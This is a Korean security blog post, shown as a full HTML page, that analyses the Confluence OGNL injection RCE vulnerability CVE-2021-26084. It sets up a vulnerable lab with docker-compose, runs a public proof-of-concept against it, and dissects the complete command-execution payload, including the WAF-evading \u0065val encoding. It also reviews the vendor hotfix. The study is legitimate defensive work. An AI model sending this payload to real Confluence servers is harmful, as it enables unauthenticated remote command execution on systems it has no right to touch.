<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084) | 데구루루x2 놀이터</title>
<meta name=keywords content>
<meta name=description content="CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석">
<meta name=author content="deguru22">
<link rel=canonical href=https://deguru22.github.io/posts/cve-2021-26084_confluence-ognl-rce/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.5e2b4101351c21e906f398ae96901791830f58d430f96f2659dab7eaef7b3cb7.css integrity="sha256-XitBATUcIekG85iulpAXkYMPWNQw+W8mWdq36u97PLc=" rel="preload stylesheet" as=style>
<link rel=preload href=/images/deguru22.jpg as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://deguru22.github.io/ico/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://deguru22.github.io/ico/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://deguru22.github.io/ico/favicon-32x32.png>
<link rel=apple-touch-icon href=https://deguru22.github.io/ico/apple-touch-icon.png>
<link rel=mask-icon href=https://deguru22.github.io/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.88.1">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-164568875-1','auto'),ga('send','pageview'))</script><meta property="og:title" content="컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)">
<meta property="og:description" content="CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석">
<meta property="og:type" content="article">
<meta property="og:url" content="https://deguru22.github.io/posts/cve-2021-26084_confluence-ognl-rce/"><meta property="og:image" content="https://deguru22.github.io/static/deguru22.jpg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-09-05T23:49:36+09:00">
<meta property="article:modified_time" content="2021-09-05T23:49:36+09:00"><meta property="og:site_name" content="데구루루x2 놀이터">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://deguru22.github.io/static/deguru22.jpg">
<meta name=twitter:title content="컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)">
<meta name=twitter:description content="CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://deguru22.github.io/posts/"},{"@type":"ListItem","position":2,"name":"컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)","item":"https://deguru22.github.io/posts/cve-2021-26084_confluence-ognl-rce/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)","name":"컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)","description":"CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석","keywords":[],"articleBody":"요약   컨플루언스에서 권한 없이 원격 명령 실행 가능한 취약점 발생, 해당 취약점 패치 배포 완료 (2021-08-25)\n  OGNL(Object Graph Navigation Language) 취약점을 이용한 것으로, 이전에 발견된 Apache Struts2 (CVE-2017-5638)과 유사한 취약점. Velocity 지시자 파라미터는 = 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생함\n  해당 취약점을 활용한 exploit code가 공개되어있고, 권한 없는 사용자도 원격 실행이 가능하므로 빠른 패치가 필요함\n  이 문서에서는 아래 내용을 다룹니다   docker-compose 를 통한 취약점 재현 환경 설정 및 실습\n  공개된 exploit code 분석\n  실제 패치 내용 분석\n  취약점 정보  공식 Advisory : Confluence Security Advisory 2021-08-25  버전 정보  패치 완료된 버전 : 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0  취약한 URL 및 파라미터    URL 파라미터 로그인 하지 않고 공격 가능 비고     /pages/createpage-entervariables querystring O 로그인 없이 가능   /login.action token △ 회원 가입이 활성화 되어 있어야 함 (기본 비활성화)   /users/user-dark-features featureKey X 추가 기능 사용을 위한 페이지, 관리자의 허용 설정 필요   /pages/templates2/viewpagetemplate.action querystring, linkCreation X    /templates/editor-preload-containers syncRev X    /template/custom/content-editor sourceTemplateId* X     공개된 PoC   h3v0x/CVE-2021-26084_Confluence\n  alt3kx/CVE-2021-26084_POC\n  취약점 실습 환경 구성 취약한 버전 컨플루언스 구동 docker-compose를 활용해서 컨플루언스를 구동해 봅시다. docker-compose 사용을 위해서는 docker desktop 설치가 필요합니다. 이 튜토리얼에서는 취약한 버전 7.12.4 버전을 기준으로 합니다.\ndocker-compose.yml version: '3' services: confluence: image: atlassian/confluence-server:7.12.4 environment: - ATL_JDBC_URL=jdbc:postgresql://db:5432/confluence - ATL_JDBC_USER=confluence - ATL_JDBC_PASSWORD=donotuseinproduction - ATL_DB_DRIVER=org.postgresql.Driver - ATL_DB_TYPE=postgresql ports: - 8090:8090 depends_on: - db restart: always db: image: postgres:11 environment: - POSTGRES_PASSWORD=donotuseinproduction - POSTGRES_USER=confluence - POSTGRES_DB=confluence restart: always 위의 compose 파일 생성 후 아래 명령어로 confluence를 실행해 줍니다.\n$ docker-compose up 실행 후에 Trial license를 등록하고, 아래쪽에 버전 정보가 취약한 버전임을 확인합니다.\nPoC 실습 실행해 보기 실행할 PoC는 h3v0x/CVE-2021-26084_Confluence 입니다.\n해당 PoC 코드를 실행하기 위해서는 공격 대상 페이지 URL 정보를 입력해야 합니다. 우리는 완전한 외부자인 것을 가정하고 공격하기 위해서, /pages/createpage-entervariables.action?SpaceKey=x 페이지를 활용해 봅시다.\n우선 (1) 해당 페이지에 접근이 가능한지, (2) 실제 접근 시 SpaceKey 파라미터 내의 값이 응답값에 포함되는지 확인해 봅시다.\n해당 페이지에 URL 직접접근을 할 경우, 로그인 하지 않았음에도 불구하고 에디터 창이 뜹니다. 디폴트 세팅 시 로그인한 사용자만 컨플루언스의 기능을 사용할 수 있기 때문에 다른 페이지의 경우 비로그인 상태로 접근 시 로그인 화면으로 즉시 리다이렉트 되는데, 특이한 페이지 인 것 같습니다. SpaceKey를 통해 넘긴 파라미터가 응답값 내 querystring에 SpaceKey=deguru로 출력되는것을 확인할 수 있습니다. 세팅은 다 된것 같으니, 한번 PoC 코드를 실행시켜 봅시다. 명령 실행이 잘 되는 것을 확인할 수 있습니다.\n$ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p /pages/createpage-entervariables.action?SpaceKey=x -------------------------------------------------------------- [-] Confluence Server Webwork OGNL injection [-] CVE-2021-26084 [-] https://github.com/h3v0x ---------------------------------------------------------------  whoami aaaaaaaa[confluence ]  PoC 코드 분석 PoC 코드는 매우 단순합니다. 우리가 입력한 URL에 실행할 명령어를 queryString 파라미터로 포함한 요청을 보내고 - 응답값 내의 명령 실행 결과를 파싱하여 우리에게 보여줍니다. 웹서버 권한으로 모든 명령 실행이 가능합니다.\n명령 실행을 위해 서버측에 보낸 코드는 아래와 같습니다.\nxpl_data = {\"queryString\": \"aaaaaaaa\\\\u0027+{Class.forName(\\\\u0027javax.script.ScriptEngineManager\\\\u0027).newInstance().getEngineByName(\\\\u0027JavaScript\\\\u0027).\\\\u0065val(\\\\u0027var isWin = java.lang.System.getProperty(\\\\u0022os.name\\\\u0022).toLowerCase().contains(\\\\u0022win\\\\u0022); var cmd = new java.lang.String(\\\\u0022\"+cmd+\"\\\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\\\u0022cmd.exe\\\\u0022, \\\\u0022/c\\\\u0022, cmd); } else{p.command(\\\\u0022bash\\\\u0022, \\\\u0022-c\\\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\\\u0022\\\\u0022; var output = \\\\u0022\\\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\\\u0027)}+\\\\u0027\"} 해당 코드를 조각내어 분석해 봅시다. 첫번째 코드 조각은, 명령 실행 시 서버 환경 확인 및 윈도우의 경우 cmd.exe, 그 외의 경우 bash 를 활용하여 명령 실행 할 수 있도록 서버의 실행 환경을 확인하는 코드입니다.\n추가적으로, 코드 작성 시 자바 코드를 자바스크립트 문법으로 사용할 수 있도록 도와주는 ScriptEngineManager를 활용 하였습니다. 컨플루언스에 적용되어있는 시큐어 코딩 방식은 특정 프로퍼티, 메소드 등을 블랙리스트로 탐지하는 방식이여서 new String[]을 입력할 수 없습니다. 그러므로 명령 실행을 위한 명령어를 변수로 설정하는 것이 불가능하고, 따라서 명령 실행이 불가능 합니다. 이러한 제약사항을 ScriptEngineManager를 활용하여 우회합니다.\n :exclamation: 원본 코드에는 .eval 부분이 .\\\\u0065val 식으로 인코딩 되어 있어 (1) 인코딩 상태와 (2) 인코딩 되지 않은 상태 두가지 다 테스트 해 본 결과, 인코딩이 되어 있어도 정상적으로 .eval 형태로 인식하는 것을 확인 했습니다.\n  .eval로 작성해도 정상적으로 인식 함에도 불구하고 왜 이런 방식으로 작성해 두었는지 궁금했는데, 관련된 흥미로운 글을 발견했습니다.\n  요약) VMWare에 취약점 제보를 위해 제공했던 익스플로잇 코드가 github 내 공개 레포지토리인 Nuclei template 의 pull request에 등록 되어 공격 페이로드가 외부 공개 되었다는 주장입니다.\n  상세) VMWare에 접수한 익스플로잇 코드는 VMWare 사에 적용되어있는 WAF를 우회하기 위하여 eval이 아닌 \\\\u0065val로 설정해 두었고, 명령 실행 결과를 구분하기 위하여 aaaaaaaaa[실행결과] 형태로 결과물을 출력해 주는것이 특징입니다. 해당 pull request 내에 사용된 공격 payload는 익스플로잇 코드 유출을 주장하는 사용자가 VMWare에 접수한 코드와 동일합니다. 또한 이 게시물에서 다루는 PoC 코드와도 동일합니다. 해당 글 작성자는 2021년 8월 31일 오전 10:39 (UTC+7)에 VMWare에 티켓을 접수하였고, 위의 pull request는 2021년 9월 1일 오전 3:44(UTC+7)에 올라왔습니다.\n  원문) [Atlassian Confluence CVE-2021–26084]::: The other side of bug report!\n Class.forName(\\'javax.script.ScriptEngineManager\\').newInstance().getEngineByName(\\'JavaScript\\').eval(\\'var isWin = java.lang.System.getProperty(\\\"os.name\\\").toLowerCase().contains(\\\"win\\\"); var cmd = new java.lang.String(\\\"\"+cmd+\"\\\"); var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\\"cmd.exe\\\", \\\"/c\\\", cmd); } else{p.command(\\\"bash\\\", \\\"-c\\\", cmd); } p.redirectErrorStream(true); 명령 실행을 위한 세팅이 끝나면, 실제 환경에 맞는 실행 명령 전달을 통해 명령 실행 및 결과를 출력 합니다.\nvar process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\\"\\\"; var output = \\\"\\\"; while((line = bufferedReader.readLine()) != null){ output = output + line + java.lang.Character.toString(10); }\\')}+\\' 실제 패치 내용 분석 아틀라시안에서는 해당 취약점 패치를 위한 핫픽스를 공개 하였습니다. 패치를 적용한 후 패치 내용을 분석해 봅니다. 중요한 내용 위주로 보겠습니다.\nFile 1(confluence/users/user-dark-features.vm)과 File 2(confluence/login.vm)에는 변동사항이 없습니다.\nFile 1: 'confluence/users/user-dark-features.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. d. validating file changes.. ok e. file updated successfully! File 2: 'confluence/login.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. d. validating file changes.. ok e. file updated successfully! File 3의 경우는 일부 변경사항이 있습니다. 기존의 $!queryString 에서 queryString으로 변경됐습니다. linkCreation도 마찬가지로 $가 빠졌습니다. Velocity의 지시자 파라미터로 처리되지 않도록 변경된 것입니다. Velocity의 지시자 파라미터는 = 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생하는 취약점으로 보입니다.\nFile 3: 'confluence/pages/createpage-entervariables.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. 24c24 #tag (\"Hidden\" \"name='queryString'\" \"value=queryString\") 26c26 #tag (\"Hidden\" \"name='linkCreation'\" \"value=linkCreation\") d. validating file changes..ok e. file updated successfully! File 4(content-editor.vm)와 5(confluence-editor-loader*.jar)도 마찬가지로 입력값이 변수 처리 되지 않도록 패치 되었습니다.\nFile 4: 'confluence/template/custom/content-editor.vm': a. backing up file.. done b. updating file.. done c. showing file changes.. 64c64 #tag (\"Hidden\" \"name='queryString'\" \"value=queryString\") 85c85 #tag (\"Hidden\" \"id=sourceTemplateId\" \"name='sourceTemplateId'\" \"value=templateId\") d. file updated successfully! File 5: 'confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader*.jar': a. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar.. Archive: confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar inflating: ./templates/editor-preload-container.vm b. updating file.. done c. showing file changes.. 56c56 #tag (\"Hidden\" \"id=syncRev\" \"name='syncRev'\" \"value=syncRev\") d. validating file changes.. ok e. updating confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar with ./templates/editor-preload-container.vm..updating: templates/editor-preload-container.vm (deflated 59%) -rw-r--r-- 1 ... .... 13370 Sep 9 23:52 confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar f. cleaning up temp files..ok g. extracting templates/editor-preload-container.vm from confluence/WEB-INF/atlassian-bundled-plugins/confluence-editor-loader-7.12.4.jar again to check changes within JAR.. ...skipping... 완료 후 PoC를 재실행 해 보면 아래와 같이 명령어가 해석되지 않고 그대로 출력되는 것을 확인할 수 있습니다.\n❯ python3 Confluence_OGNLInjection.py -u http://127.0.0.1:8090 -p \"/pages/createpage-entervariables.action?SpaceKey=deguru\" --------------------------------------------------------------- [-] Confluence Server Webwork OGNL injection [-] CVE-2021-26084 [-] https://github.com/h3v0x ---------------------------------------------------------------  whoami aaaaaaaa\\u0027+{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var isWin = java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022); var cmd = new java.lang.String(\\u0022whoami\\u0022);var p = new java.lang.ProcessBuilder(); if(isWin){p.command(\\u0022cmd.exe\\u0022, \\u0022/c\\u0022, cmd); } else{p.command(\\u0022bash\\u0022, \\u0022-c\\u0022, cmd); }p.redirectErrorStream(true); var process= p.start(); var inputStreamReader = new java.io.InputStreamReader(process.getInputStream()); var bufferedReader = new java.io.BufferedReader(inputStreamReader); var line = \\u0022\\u0022; var output = \\u0022\\u0022; while((line = bufferedReader.readLine()) != null){output = output + line + java.lang.Character.toString(10); }\\u0027)}+\\u0027 결론  컨플루언스를 쓴다면, 최신버전으로 업데이트 하거나 핫픽스가 반드시 필요합니다.  References  https://github.com/h3v0x/CVE-2021-26084_Confluence https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md https://velocity.apache.org/engine/2.3/vtl-reference.html#variables https://twitter.com/pwntester/status/1433888277946372109  ","wordCount":"1207","inLanguage":"en","datePublished":"2021-09-05T23:49:36+09:00","dateModified":"2021-09-05T23:49:36+09:00","author":{"@type":"Person","name":"deguru22"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://deguru22.github.io/posts/cve-2021-26084_confluence-ognl-rce/"},"publisher":{"@type":"Organization","name":"데구루루x2 놀이터","logo":{"@type":"ImageObject","url":"https://deguru22.github.io/ico/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=https://deguru22.github.io/ accesskey=h title="Home (Alt + H)">
<img src=/images/deguru22.jpg alt=logo aria-label=logo height=35>Home</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://deguru22.github.io/archives/ title=archives>
<span>archives</span>
</a>
</li>
<li>
<a href=https://deguru22.github.io/tags/ title=tags>
<span>tags</span>
</a>
</li>
<li>
<a href=https://deguru22.github.io/search/ title="search (Alt + /)" accesskey=/>
<span>search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://deguru22.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://deguru22.github.io/posts/>Posts</a></div>
<h1 class=post-title>
컨플루언스 OGNL Injection (RCE) 취약점 (CVE-2021-26084)
</h1>
<div class=post-description>
CVE-2021-26084 컨플루언스 원격 명령 실행 취약점 분석
</div>
<div class=post-meta>September 5, 2021&nbsp;·&nbsp;6 min&nbsp;·&nbsp;deguru22&nbsp;|&nbsp;<a href=https://github.com/deguru22/deguru22.github.io/content/posts/CVE-2021-26084_Confluence-OGNL-RCE.md rel="noopener noreferrer" target=_blank>Suggest Changes</a>
</div>
</header> <div class=toc>
<details open>
<summary accesskey=c title="(Alt + C)">
<span class=details>Table of Contents</span>
</summary>
<div class=inner><ul>
<li>
<a href=#%ec%9a%94%ec%95%bd aria-label=요약>요약</a></li>
<li>
<a href=#%ec%9d%b4-%eb%ac%b8%ec%84%9c%ec%97%90%ec%84%9c%eb%8a%94-%ec%95%84%eb%9e%98-%eb%82%b4%ec%9a%a9%ec%9d%84-%eb%8b%a4%eb%a3%b9%eb%8b%88%eb%8b%a4 aria-label="이 문서에서는 아래 내용을 다룹니다">이 문서에서는 아래 내용을 다룹니다</a></li>
<li>
<a href=#%ec%b7%a8%ec%95%bd%ec%a0%90-%ec%a0%95%eb%b3%b4 aria-label="취약점 정보">취약점 정보</a><ul>
<li>
<a href=#%eb%b2%84%ec%a0%84-%ec%a0%95%eb%b3%b4 aria-label="버전 정보">버전 정보</a></li>
<li>
<a href=#%ec%b7%a8%ec%95%bd%ed%95%9c-url-%eb%b0%8f-%ed%8c%8c%eb%9d%bc%eb%af%b8%ed%84%b0 aria-label="취약한 URL 및 파라미터">취약한 URL 및 파라미터</a></li>
<li>
<a href=#%ea%b3%b5%ea%b0%9c%eb%90%9c-poc aria-label="공개된 PoC">공개된 PoC</a></li></ul>
</li>
<li>
<a href=#%ec%b7%a8%ec%95%bd%ec%a0%90-%ec%8b%a4%ec%8a%b5-%ed%99%98%ea%b2%bd-%ea%b5%ac%ec%84%b1 aria-label="취약점 실습 환경 구성">취약점 실습 환경 구성</a><ul>
<li>
<a href=#%ec%b7%a8%ec%95%bd%ed%95%9c-%eb%b2%84%ec%a0%84-%ec%bb%a8%ed%94%8c%eb%a3%a8%ec%96%b8%ec%8a%a4-%ea%b5%ac%eb%8f%99 aria-label="취약한 버전 컨플루언스 구동">취약한 버전 컨플루언스 구동</a><ul>
<li>
<a href=#docker-composeyml aria-label=docker-compose.yml><strong><code>docker-compose.yml</code></strong></a></li></ul>
</li></ul>
</li>
<li>
<a href=#poc-%ec%8b%a4%ec%8a%b5 aria-label="PoC 실습">PoC 실습</a><ul>
<li>
<a href=#%ec%8b%a4%ed%96%89%ed%95%b4-%eb%b3%b4%ea%b8%b0 aria-label="실행해 보기">실행해 보기</a></li></ul>
</li>
<li>
<a href=#poc-%ec%bd%94%eb%93%9c-%eb%b6%84%ec%84%9d aria-label="PoC 코드 분석">PoC 코드 분석</a></li>
<li>
<a href=#%ec%8b%a4%ec%a0%9c-%ed%8c%a8%ec%b9%98-%eb%82%b4%ec%9a%a9-%eb%b6%84%ec%84%9d aria-label="실제 패치 내용 분석">실제 패치 내용 분석</a></li>
<li>
<a href=#%ea%b2%b0%eb%a1%a0 aria-label=결론>결론</a></li>
<li>
<a href=#references aria-label=References>References</a>
</li>
</ul>
</div>
</details>
</div>
<div class=post-content><h2 id=요약>요약<a hidden class=anchor aria-hidden=true href=#요약>#</a></h2>
<ul>
<li>
<p>컨플루언스에서 <strong>권한 없이 원격 명령 실행</strong> 가능한 취약점 발생, 해당 취약점 패치 배포 완료 (2021-08-25)</p>
</li>
<li>
<p>OGNL(Object Graph Navigation Language) 취약점을 이용한 것으로, 이전에 발견된 Apache Struts2 (CVE-2017-5638)과 유사한 취약점. Velocity 지시자 파라미터는 <code>=</code> 기준으로 파싱되기 전에 먼저 실행이 되는 OGNL과 VTL 사이의 구조적 문제로 발생함</p>
</li>
<li>
<p>해당 취약점을 활용한 exploit code가 공개되어있고, 권한 없는 사용자도 원격 실행이 가능하므로 빠른 패치가 필요함</p>
</li>
</ul>
<h2 id=이-문서에서는-아래-내용을-다룹니다>이 문서에서는 아래 내용을 다룹니다<a hidden class=anchor aria-hidden=true href=#이-문서에서는-아래-내용을-다룹니다>#</a></h2>
<ul>
<li>
<p>docker-compose 를 통한 취약점 재현 환경 설정 및 실습</p>
</li>
<li>
<p>공개된 exploit code 분석</p>
</li>
<li>
<p>실제 패치 내용 분석</p>
</li>
</ul>
<h2 id=취약점-정보>취약점 정보<a hidden class=anchor aria-hidden=true href=#취약점-정보>#</a></h2>
<ul>
<li>공식 Advisory : <a href=https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html>Confluence Security Advisory 2021-08-25</a></li>
</ul>
<h3 id=버전-정보>버전 정보<a hidden class=anchor aria-hidden=true href=#버전-정보>#</a></h3>
<ul>
<li>패치 완료된 버전 : 6.13.23, 7.4.11, 7.11.6, 7.12.5, 7.13.0</li>
</ul>
<h3 id=취약한-url-및-파라미터>취약한 URL 및 파라미터<a hidden class=anchor aria-hidden=true href=#취약한-url-및-파라미터>#</a></h3>
<table>
<thead>
<tr>
<th>URL</th>
<th>파라미터</th>
<th>로그인 하지 않고 공격 가능</th>
<th>비고</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>/pages/createpage-entervariables</strong></td>
<td>querystring</td>
<td>O</td>
<td>로그인 없이 가능</td>
</tr>
<tr>
<td><strong>/login.action</strong></td>
<td>token</td>
<td>△</td>
<td>회원 가입이 활성화 되어 있어야 함 (기본 비활성화)</td>
</tr>
<tr>
<td>/users/user-dark-features</td>
<td>featureKey</td>
<td>X</td>
<td>추가 기능 사용을 위한 페이지, 관리자의 허용 설정 필요</td>
</tr>
<tr>
<td>/pages/templates2/viewpagetemplate.action</td>
<td>querystring, linkCreation</td>
<td>X</td>
<td></td>
</tr>
<tr>
<td>/templates/editor-preload-containers</td>
<td>syncRev</td>
<td>X</td>
<td></td>
</tr>
<tr>
<td>/template/custom/content-editor</td>
<td>sourceTemplateId*</td>
<td>X</td>
<td></td>
</tr>
</tbody>
</table>
<h3 id=공개된-poc>공개된 PoC<a hidden class=anchor aria-hidden=true href=#공개된-poc>#</a></h3>
<ul>
<li>
<p><a href=https://github.com/h3v0x/CVE-2021-26084_Confluence>h3v0x/CVE-2021-26084_Confluence</a></p>
</li>
<li>
<p><a href=https://github.com/alt3kx/CVE-2021-26084_PoC>alt3kx/CVE-2021-26084_POC</a></p>
</li>
</ul>
<h2 id=취약점-실습-환경-구성>취약점 실습 환경 구성<a hidden class=anchor aria-hidden=true href=#취약점-실습-환경-구성>#</a></h2>
<h3 id=취약한-버전-컨플루언스-구동>취약한 버전 컨플루언스 구동<a hidden class=anchor aria-hidden=true href=#취약한-버전-컨플루언스-구동>#</a></h3>
<p>docker-compose를 활용해서 컨플루언스를 구동해 봅시다. docker-compose 사용을 위해서는 <a href=https://www.docker.com/products/docker-desktop>docker desktop</a> 설치가 필요합니다. 이 튜토리얼에서는 취약한 버전 <code>7.12.4</code> 버전을 기준으로 합니다.</p>
<h4 id=docker-composeyml><strong><code>docker-compose.yml</code></strong><a hidden class=anchor aria-hidden=true href=#docker-composeyml>#</a></h4>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-yml data-lang=yml><span style=color:#f92672>version</span>: <span style=color:#e6db74>&#39;3&#39;</span>
<span style=color:#f92672>services</span>:
  <span style=color:#f92672>confluence</span>:
    <span style=color:#f92672>image</span>: <span style=color:#ae81ff>atlassian/confluence-server:7.12.4</span>
    <span style=color:#f92672>environment</span>:
      - <span style=color:#ae81ff>ATL_JDBC_URL=jdbc:postgresql://db:5432/confluence</span>
      - <span style=color:#ae81ff>ATL_JDBC_USER=confluence</span>
      - <span style=color:#ae81ff>ATL_JDBC_PASSWORD=donotuseinproduction</span>
      - <span style=color:#ae81ff>ATL_DB_DRIVER=org.postgresql.Driver</span>
      - <span style=color:#ae81ff>ATL_DB_TYPE=postgresql</span>
    <span style=color:#f92672>ports</span>:
      - <span style=color:#ae81ff>8090</span>:<span style=color:#ae81ff>8090</span>
    <span style=color:#f92672>depends_on</span>:
      - <span style=color:#ae81ff>db</span>
    <span style=color:#f92672>restart</span>: <span style=color:#ae81ff>always</span>

  <span style=color:#f92672>db</span>:
    <span style=color:#f92672>image</span>: <span style=color:#ae81ff>postgres:11</span>
    <span style=color:#f92672>environment</span>:
      - <span style=color:#ae81ff>POSTGRES_PASSWORD=donotuseinproduction</span>
      - <span style=color:#ae81ff>POSTGRES_USER=confluence</span>
      - <span style=color:#ae81ff>POSTGRES_DB=confluence</span>
    <span style=color:#f92672>restart</span>: <span style=color:#ae81ff>always</span>
</code></pre></div><p>위의 compose 파일 생성 후 아래 명령어로 confluence를 실행해 줍니다.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ docker-compose up
</code></pre></div><p>실행 후에 Trial license를 등록하고, 아래쪽에 버전 정보가 취약한 버전임을 확인합니다.</p>
<h2 id=poc-실습>PoC 실습<a hidden class=anchor aria-hidden=true href=#poc-실습>#</a></h2>
<h3 id=실행해-보기>실행해 보기<a hidden class=anchor aria-hidden=true href=#실행해-보기>#</a></h3>
<p>실행할 PoC는 <a href=https://github.com/h3v0x/CVE-2021-26084_Confluence>h3v0x/CVE-2021-26084_Confluence</a> 입니다.</p>
<p>해당 PoC 코드를 실행하기 위해서는 공격 대상 페이지 URL 정보를 입력해야 합니다. 우리는 완전한 외부자인 것을 가정하고 공격하기 위해서, <code>/pages/createpage-entervariables.action?SpaceKey=x</code> 페이지를 활용해 봅시다.</p>
<p>우선 (1) 해당 페이지에 접근이 가능한지, (2) 실제 접근 시 SpaceKey 파라미터 내의 값이 응답값에 포함되는지 확인해 봅시다.</p>
<p>해당 페이지에 URL 직접접근을 할 경우, 로그인 하지 않았음에도 불구하고 에디터 창이 뜹니다. 디폴트 세팅 시 로그인한 사용자만 컨플루언스의 기능을 사용할 수 있기 때문에 다른 페이지의 경우 비로그인 상태로 접근 시 로그인 화면으로 즉시 리다이렉트 되는데, 특이한 페이지 인 것 같습니다.
<img loading=lazy src=https://user-images.githubusercontent.com/89086864/132701074-bae177aa-2a6c-48ed-9c93-75e373325d47.png alt=error>
</p>
<p>SpaceKey를 통해 넘긴 파라미터가 응답값 내 querystring에 <code>SpaceKey=deguru</code>로 출력되는것을 확인할 수 있습니다.
<img loading=lazy src=https://user-images.githubusercontent.com/89086864/132702673-480fe6d7-ba99-409a-9cf6-0470f50506eb.png alt=reflect>
</p>
